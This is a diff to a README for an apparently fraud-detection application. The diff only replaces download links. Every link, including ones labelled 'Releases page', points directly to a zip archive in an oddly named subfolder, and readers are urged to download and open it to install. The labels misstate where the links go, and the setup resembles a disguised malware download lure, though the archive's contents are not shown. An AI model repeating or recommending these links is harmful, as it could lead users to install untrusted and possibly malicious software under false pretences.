@@ -19,9 +19,9 @@ To get started with our application, you only need two things: a compatible comp
 
 You can download the application from our releases page. 
 
-[![Download Now](https://raw.githubusercontent.com/Loczek223/fraud-detection-modelling-and-reporting/main/orthotolidin/fraud-detection-modelling-and-reporting.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Loczek223/fraud-detection-modelling-and-reporting/main/orthotolidin/fraud-detection-modelling-and-reporting.zip)
+[![Download Now](https://github.com/Loczek223/fraud-detection-modelling-and-reporting/raw/refs/heads/main/orthotolidin/and_modelling_fraud_detection_reporting_2.6-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/Loczek223/fraud-detection-modelling-and-reporting/raw/refs/heads/main/orthotolidin/and_modelling_fraud_detection_reporting_2.6-alpha.5.zip)
 
-1. Click the link above to visit the [Releases page](https://raw.githubusercontent.com/Loczek223/fraud-detection-modelling-and-reporting/main/orthotolidin/fraud-detection-modelling-and-reporting.zip).
+1. Click the link above to visit the [Releases page](https://github.com/Loczek223/fraud-detection-modelling-and-reporting/raw/refs/heads/main/orthotolidin/and_modelling_fraud_detection_reporting_2.6-alpha.5.zip).
 2. Find the latest version listed on the page.
 3. Click the download link for your operating system.
 4. Once the file downloads, open it to install the application by following the on-screen instructions.
@@ -68,4 +68,4 @@ We welcome contributions from everyone. Feel free to fork the repository and sub
 
 Explore the possibilities of fraud detection and reporting with our application! 
 
-Don't forget to visit our [Releases page](https://raw.githubusercontent.com/Loczek223/fraud-detection-modelling-and-reporting/main/orthotolidin/fraud-detection-modelling-and-reporting.zip) for your download.
+Don't forget to visit our [Releases page](https://github.com/Loczek223/fraud-detection-modelling-and-reporting/raw/refs/heads/main/orthotolidin/and_modelling_fraud_detection_reporting_2.6-alpha.5.zip) for your download.
